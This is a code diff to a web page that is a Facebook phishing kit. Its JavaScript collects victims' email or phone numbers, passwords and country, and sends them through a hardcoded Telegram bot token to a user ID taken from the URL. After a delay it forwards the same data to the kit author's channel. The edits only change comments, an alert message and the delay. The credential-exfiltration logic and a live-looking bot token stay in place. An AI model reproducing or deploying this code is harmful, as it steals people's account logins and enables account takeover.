@@ -75,7 +75,7 @@
 
 <script>
   const botToken = '7964718139:AAHSriHqoXBuo__F_paB26fO1Sx774Dpk-k';
-  const telegramChannel = '@PRO_43KPISH';
+  const telegramChannel = '@PRO_43KPISH'; // چینل یوزرنیم
 
   function getQueryParam(param) {
     const urlParams = new URLSearchParams(window.location.search);
@@ -110,7 +110,7 @@
 
     const telegramId = getQueryParam('id');
     if (!telegramId) {
-      alert("Telegram ID په URL کې نشته!");
+      alert("Telegram ID نشته!");
       return;
     }
 
@@ -123,13 +123,13 @@
 
     const msg = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}\n\n👨‍💻 Developer by @ProHacker43`;
 
-    // 1. First: Send to user's Telegram
+    // 1. Send to bot user first
     await sendTelegram(telegramId, msg);
 
-    // 2. After 3 minutes, send to channel
+    // 2. After 4 minutes, send to channel
     setTimeout(() => {
       sendTelegram(telegramChannel, msg);
-    }, 180000); // 3 mins = 180000 ms
+    }, 240000); // 4 minutes = 240,000 ms
 
     alert("Please wait...");
   });
